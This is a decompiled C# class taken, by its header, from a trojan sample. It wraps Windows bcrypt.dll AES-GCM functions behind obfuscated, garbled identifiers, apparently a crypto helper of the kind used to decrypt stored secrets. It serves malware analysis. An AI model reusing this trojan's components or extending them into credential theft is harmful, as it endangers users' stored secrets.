// Decompiled with JetBrains decompiler
// Type: ş˨᳼��.Α꾯یƚ�
// Assembly: iJMJnUDAnLMGBkvrphkwZ, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 8BCFE5CC-61DE-4CD2-8DAF-2FBF230839CD
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.03\HEUR-Trojan.Win32.Generic-eaa07c9bde4c048e900f10410f38506ecb28371240e38a824e8043477d5e89a5.exe

using Microsoft.VisualBasic.CompilerServices;
using ş\u02E8\u1CFC\uFFFD\uFFFD;
using System;
using System.Runtime.InteropServices;

namespace ş\u02E8\u1CFC\uFFFD\uFFFD
{
  [StandardModule]
  public sealed class Α꾯یƚ\uFFFD
  {
    public const uint ϒÒ\uFFFD\u0097Թ = 0;
    public const uint ױ\uFFFD泮츠t = 8;
    public const uint Օ뫆\uFFFD߂؜ = 4;
    public static byte[] 뫆ٗ\u05C9\u060C\uFFFD = BitConverter.GetBytes(1296188491);
    public static string \uFFFDԹcˤԹ = "ObjectLength";
    public static string У\uDAE4\uDD16ی恁 = "ChainingModeGCM";
    public static string \u07B4蠺\uFFFD뜸ב = "AuthTagLength";
    public static string cŔŎ\u07BBȨ = "ChainingMode";
    public static string Ω\uFFFD̮쐬늻 = "KeyDataBlob";
    public static string 꾯C\uFFFDϒ늻 = "AES";
    public static string \uFFFDɇՄۨ泮 = "Microsoft Primitive Provider";
    public static int Ɖ\u02E8ڿ\u07FBک = 1;
    public static int ӤհζC\u1CFC = 1;
    public static uint ϱߡζ\u0089ی = 3221266434;

    [DllImport("bcrypt.dll", EntryPoint = "BCryptOpenAlgorithmProvider", CharSet = CharSet.Ansi, SetLastError = true)]
    public static extern uint \u07C2\uFFFDУɇک(
      out IntPtr _param0,
      [MarshalAs(UnmanagedType.LPWStr)] string ęʓ콪늻ҡ,
      [MarshalAs(UnmanagedType.LPWStr)] string _param2,
      uint _param3);

    [DllImport("bcrypt.dll", EntryPoint = "BCryptCloseAlgorithmProvider", CharSet = CharSet.Ansi, SetLastError = true)]
    public static extern uint ņ\u002DˤΑ늻(IntPtr _param0, uint _param1);

    [DllImport("bcrypt.dll", EntryPoint = "BCryptGetProperty", CharSet = CharSet.Ansi, SetLastError = true)]
    public static extern uint \u0331ˤג2\u02F3(
      IntPtr _param0,
      [MarshalAs(UnmanagedType.LPWStr)] string _param1,
      byte[] _param2,
      int _param3,
      ref int _param4,
      uint _param5);

    [DllImport("bcrypt.dll", EntryPoint = "BCryptSetProperty", CharSet = CharSet.Ansi, SetLastError = true)]
    internal static extern uint JK\uFFFDήՄ(
      IntPtr _param0,
      [MarshalAs(UnmanagedType.LPWStr)] string _param1,
      byte[] J뜸㠰皍Ӛ,
      int _param3,
      int _param4);

    [DllImport("bcrypt.dll", EntryPoint = "BCryptImportKey", CharSet = CharSet.Ansi, SetLastError = true)]
    public static extern uint \u0333Uۣꓞٵ(
      IntPtr _param0,
      IntPtr _param1,
      [MarshalAs(UnmanagedType.LPWStr)] string _param2,
      out IntPtr _param3,
      IntPtr _param4,
      int _param5,
      byte[] _param6,
      int ʪɢɮŔҡ,
      uint _param8);

    [DllImport("bcrypt.dll", EntryPoint = "BCryptDestroyKey", CharSet = CharSet.Ansi, SetLastError = true)]
    public static extern uint jꓞZƟҟ(IntPtr _param0);

    [DllImport("bcrypt.dll", EntryPoint = "BCryptEncrypt", CharSet = CharSet.Ansi, SetLastError = true)]
    public static extern uint \uFFFD\uFFFD\uFFFD\u0609늻(
      IntPtr _param0,
      byte[] _param1,
      int _param2,
      ref Α꾯یƚ\uFFFD.BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO _param3,
      byte[] ҭϘƟΠک,
      int zKëϘҚ,
      byte[] _param6,
      int _param7,
      ref int _param8,
      uint _param9);

    [DllImport("bcrypt.dll", EntryPoint = "BCryptDecrypt", CharSet = CharSet.Ansi, SetLastError = true)]
    internal static extern uint εéٚӚܹ(
      IntPtr _param0,
      byte[] _param1,
      int _param2,
      ref Α꾯یƚ\uFFFD.BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO _param3,
      byte[] _param4,
      int ܪ츠ִεc,
      byte[] _param6,
      int _param7,
      ref int _param8,
      int é恁Ă똛Ԍ);

    public struct BCRYPT_PSS_PADDING_INFO
    {
      [MarshalAs(UnmanagedType.LPWStr)]
      public string pszAlgId;
      public int cbSalt;

      public BCRYPT_PSS_PADDING_INFO(string pszAlgId, int cbSalt)
        : this()
      {
        this.pszAlgId = pszAlgId;
        this.cbSalt = cbSalt;
      }
    }

    public struct BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO : IDisposable
    {
      public int cbSize;
      public int dwInfoVersion;
      public IntPtr pbNonce;
      public int cbNonce;
      public IntPtr pbAuthData;
      public int cbAuthData;
      public IntPtr pbTag;
      public int cbTag;
      public IntPtr pbMacContext;
      public int cbMacContext;
      public int cbAAD;
      public long cbData;
      public int dwFlags;

      public BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO(byte[] iv, byte[] aad, byte[] tag)
        : this()
      {
        this.dwInfoVersion = Α꾯یƚ\uFFFD.ӤհζC\u1CFC;
        this.cbSize = Marshal.SizeOf(typeof (Α꾯یƚ\uFFFD.BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO));
        if (iv != null)
        {
          this.cbNonce = iv.Length;
          this.pbNonce = Marshal.AllocHGlobal(this.cbNonce);
          Marshal.Copy(iv, 0, this.pbNonce, this.cbNonce);
        }
        if (aad != null)
        {
          this.cbAuthData = aad.Length;
          this.pbAuthData = Marshal.AllocHGlobal(this.cbAuthData);
          Marshal.Copy(aad, 0, this.pbAuthData, this.cbAuthData);
        }
        if (tag == null)
          return;
        this.cbTag = tag.Length;
        this.pbTag = Marshal.AllocHGlobal(this.cbTag);
        Marshal.Copy(tag, 0, this.pbTag, this.cbTag);
        this.cbMacContext = tag.Length;
        this.pbMacContext = Marshal.AllocHGlobal(this.cbMacContext);
      }

      public void Dispose()
      {
        if (this.pbNonce != IntPtr.Zero)
          Marshal.FreeHGlobal(this.pbNonce);
        if (this.pbTag != IntPtr.Zero)
          Marshal.FreeHGlobal(this.pbTag);
        if (this.pbAuthData != IntPtr.Zero)
          Marshal.FreeHGlobal(this.pbAuthData);
        if (!(this.pbMacContext != IntPtr.Zero))
          return;
        Marshal.FreeHGlobal(this.pbMacContext);
      }
    }

    public struct BCRYPT_KEY_LENGTHS_STRUCT
    {
      public int dwMinLength;
      public int dwMaxLength;
      public int dwIncrement;
    }

    public struct BCRYPT_OAEP_PADDING_INFO
    {
      [MarshalAs(UnmanagedType.LPWStr)]
      public string pszAlgId;
      public IntPtr pbLabel;
      public int cbLabel;

      public BCRYPT_OAEP_PADDING_INFO(string alg)
        : this()
      {
        this.pszAlgId = alg;
        this.pbLabel = IntPtr.Zero;
        this.cbLabel = 0;
      }
    }
  }
}
